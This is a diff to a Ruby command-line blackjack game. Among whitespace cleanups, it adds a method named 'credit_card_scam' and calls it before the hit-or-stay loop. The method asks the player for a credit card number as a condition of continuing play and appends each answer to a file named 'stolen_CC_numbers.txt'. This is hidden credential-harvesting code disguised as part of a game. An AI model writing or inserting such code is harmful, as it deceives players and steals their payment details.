@@ -54,6 +54,12 @@ def game_play (score, limit)
   score < limit
 end
 
+def credit_card_scam
+  File.open('stolen_CC_numbers.txt', 'a') do |f|
+  f.puts prompt("Please submit your credit card number information to continue:")
+  end
+end
+
 correct_input = ["h","s"]
 
 player = "Player"
@@ -64,14 +70,14 @@ dealer_cards = []
 
 deck = build_deck
 
- 
+
 # Player is dealt a card (x2)
 
 2.times do
   player_cards << deck.pop
   dealer_cards << deck.pop
 end
- 
+
 # Display inital hand
 
 player_total = calculate_value(player_cards)
@@ -81,13 +87,15 @@ show_card(player, player_cards[0])
 show_card(player, player_cards[1])
 show_total(player, player_total)
 
-# Prompt player to hit or stand 
+# Prompt player to hit or stand
+
+credit_card_scam
 
 next_turn = nil
 while next_turn != "s"
   next_turn = prompt("[h]it or [s]tay?")
 # If input is invalid (neither hit or stand) notify and reprompt
-  if !correct_input.include?(next_turn)    
+  if !correct_input.include?(next_turn)
     puts "Invalid input, please put either h for hit or s for stay."
   elsif next_turn == "h"
 # If player hits deal another card
@@ -106,7 +114,7 @@ while next_turn != "s"
       end
   elsif next_turn == "s"
   # If player stands
- 
+
     # Display player's recalculated score
     player_total = calculate_value(player_cards)
     show_total(player, player_total)
@@ -140,15 +148,15 @@ end
 
 
 
- 
+
       # If dealer score is less than 17
- 
+
         # Continue hitting until score over 17
- 
+
       # If dealer score is greater than 21
- 
+
         # Dealer loses
- 
+
 # If score equals 21, they win
- 
+
 # If score less than 21, player with the higher score wins
